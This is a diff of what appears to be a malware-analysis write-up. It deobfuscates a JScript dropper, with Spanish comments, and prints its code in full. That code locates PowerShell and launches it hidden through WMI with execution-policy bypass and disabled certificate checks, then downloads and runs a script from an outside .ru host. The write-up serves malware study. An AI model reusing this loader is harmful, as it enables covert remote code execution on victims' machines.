@@ -32,19 +32,20 @@ var array_cifrado_movido = ['winmgmts:{impersonationLevel=impersonate}!\\.\root\
 
 Function to rotate array:
 ```javascript
- (function(array_cifrado_parametro, var_0x155) {
-			/*
-			* gira 250 veces el array
-			*/
-            var remueve_array = function(var_contador) {
-                while (--var_contador) {
+ (function(array_cifrado_parametro, var_0x155) 
+ {
+	/*
+	* gira 250 veces el array
+	*/
+	    var remueve_array = function(var_contador) {
+		while (--var_contador) {
 					// '\x70\x75\x73\x68' = push 
 					// '\x73\x68\x69\x66\x74' = shift 
-					
-                    array_cifrado_parametro['push'](array_cifrado_parametro['shift']());
-                }
-            };
-            remueve_array(++var_0x155);
+
+		    array_cifrado_parametro['push'](array_cifrado_parametro['shift']());
+		}
+	    };
+	    remueve_array(++var_0x155);
         }(array_cifrado_Antes_llamado_0xa994, 0x155));
 ```
 
@@ -57,20 +58,20 @@ Malware will use these variables in this code, this code will run the method abc
 ```javascript
 try {
 var i = 0x258;
-// extraerString_AntesLlamado_0x4a99('0xb') = "toPrecision"
-alert(i["toPrecision"](0x1f40));
+	// extraerString_AntesLlamado_0x4a99('0xb') = "toPrecision"
+	alert(i["toPrecision"](0x1f40));
 } catch (_0x356210) {
 try {
 	// extraerString_AntesLlamado_0x4a99('0xc') = "https://bogerando.ru"
-    url = "https://bogerando.ru";
-    showexec = 0x0;
+    	url = "https://bogerando.ru";
+    	showexec = 0x0;
 	// extraerString_AntesLlamado_0x4a99('0xd') = "WScript.Shell"
-    wshel = new ActiveXObject("WScript.Shell");
+   	 wshel = new ActiveXObject("WScript.Shell");
 	//extraerString_AntesLlamado_0x4a99('0xe') = "Scripting.FileSystemObject"
-    fso = new ActiveXObject("Scripting.FileSystemObject");
-    if (is_ps_installed()) {
+    	fso = new ActiveXObject("Scripting.FileSystemObject");
+    	if (is_ps_installed()) {
 		// extraerString_AntesLlamado_0x4a99('0xf') = " -nop -ep Bypass -noexit -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; iex ((New-Object System.Net.WebClient).DownloadString('"
-        // extraerString_AntesLlamado_0x4a99('0x10') = " /p1'))"
+		// extraerString_AntesLlamado_0x4a99('0x10') = " /p1'))"
 		abc_bbb(pspath + " -nop -ep Bypass -noexit -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; iex ((New-Object System.Net.WebClient).DownloadString('" + url + " /p1'))", showexec);
     }
 } catch (_0x243c33) {}
@@ -81,20 +82,20 @@ function is_ps_installed() {
 /*
 * Función para obtener la ruta hacia powershell
 */
-//\x45\x78\x70\x61\x6e\x64\x45\x6e\x76\x69\x72\x6f\x6e\x6d\x65\x6e\x74\x53\x74\x72\x69\x6e\x67\x73 = ExpandEnvironmentStrings
-pspath = wshel['ExpandEnvironmentStrings']("%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"); // extraerString_AntesLlamado_0x4a99('0x7') =  "%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
-// extraerString_AntesLlamado_0x4a99('0x8') = "FileExists"
-if (fso["FileExists"](pspath)) {
-    return pspath;
-} else {
-	// extraerString_AntesLlamado_0x4a99('0x9') = "ExpandEnvironmentStrings"
-	// extraerString_AntesLlamado_0x4a99('0xa') = "%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"
-    pspath = wshel["ExpandEnvironmentStrings"]("%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe");
-    if (fso["FileExists"](pspath)) {
-        return pspath;
-    }
-}
-return null;
+	//\x45\x78\x70\x61\x6e\x64\x45\x6e\x76\x69\x72\x6f\x6e\x6d\x65\x6e\x74\x53\x74\x72\x69\x6e\x67\x73 = ExpandEnvironmentStrings
+	pspath = wshel['ExpandEnvironmentStrings']("%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"); // extraerString_AntesLlamado_0x4a99('0x7') =  "%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
+	// extraerString_AntesLlamado_0x4a99('0x8') = "FileExists"
+	if (fso["FileExists"](pspath)) {
+	    return pspath;
+	} else {
+		// extraerString_AntesLlamado_0x4a99('0x9') = "ExpandEnvironmentStrings"
+		// extraerString_AntesLlamado_0x4a99('0xa') = "%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"
+	    pspath = wshel["ExpandEnvironmentStrings"]("%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe");
+	    if (fso["FileExists"](pspath)) {
+		return pspath;
+	    }
+	}
+	return null;
 }
 ```
 Finally the abc_bbb code, will create some winmgmts objects to run powershell with a hidden console, this powershell command will download and run powershell code. Here is the abc_bbb function:
@@ -106,16 +107,16 @@ function abc_bbb(_0xe83a79, showexec_0x52b22a) {
 * showexec_0x52b22a = 0x0 (No mostrar consola)
 */
 try {
-    var _0x32ce2c = GetObject("winmgmts:{impersonationLevel=impersonate}!\.ootcimv2"); //  extraerString_AntesLlamado_0x4a99('0x0') = "winmgmts:{impersonationLevel=impersonate}!\.ootcimv2"
-    var _0x6b4dc5 = _0x32ce2c["Get"]("Win32_ProcessStartup"); // extraerString_AntesLlamado_0x4a99('0x1') = "Get" , extraerString_AntesLlamado_0x4a99('0x2') = "Win32_ProcessStartup"
-    var Object_config_0xa44dcc = _0x6b4dc5["SpawnInstance_"](); // extraerString_AntesLlamado_0x4a99('0x3') = "SpawnInstance_"
-    Object_config_0xa44dcc["ShowWindow"] = showexec_0x52b22a; // extraerString_AntesLlamado_0x4a99('0x4') = "ShowWindow"
-    var _0x180dea = GetObject("winmgmts:rootcimv2:Win32_Process"); // extraerString_AntesLlamado_0x4a99('0x5') = "winmgmts:rootcimv2:Win32_Process"
-    var Process_ID_0x321dea; // aqui guardara el PID del proceso
-    return _0x180dea["Create"](_0xe83a79, null, Object_config_0xa44dcc, Process_ID_0x321dea); // extraerString_AntesLlamado_0x4a99('0x6') = "Create"
-} catch (_0x352a82) {}
-// ![] = false
-return false;
+	    var _0x32ce2c = GetObject("winmgmts:{impersonationLevel=impersonate}!\.ootcimv2"); //  extraerString_AntesLlamado_0x4a99('0x0') = "winmgmts:{impersonationLevel=impersonate}!\.ootcimv2"
+	    var _0x6b4dc5 = _0x32ce2c["Get"]("Win32_ProcessStartup"); // extraerString_AntesLlamado_0x4a99('0x1') = "Get" , extraerString_AntesLlamado_0x4a99('0x2') = "Win32_ProcessStartup"
+	    var Object_config_0xa44dcc = _0x6b4dc5["SpawnInstance_"](); // extraerString_AntesLlamado_0x4a99('0x3') = "SpawnInstance_"
+	    Object_config_0xa44dcc["ShowWindow"] = showexec_0x52b22a; // extraerString_AntesLlamado_0x4a99('0x4') = "ShowWindow"
+	    var _0x180dea = GetObject("winmgmts:rootcimv2:Win32_Process"); // extraerString_AntesLlamado_0x4a99('0x5') = "winmgmts:rootcimv2:Win32_Process"
+	    var Process_ID_0x321dea; // aqui guardara el PID del proceso
+	    return _0x180dea["Create"](_0xe83a79, null, Object_config_0xa44dcc, Process_ID_0x321dea); // extraerString_AntesLlamado_0x4a99('0x6') = "Create"
+	} catch (_0x352a82) {}
+	// ![] = false
+	return false;
 }
 ```
 Last function is an interesting function to decode each line from first array, instead of using normal javascript functions to decode the line, it will decode character by character.
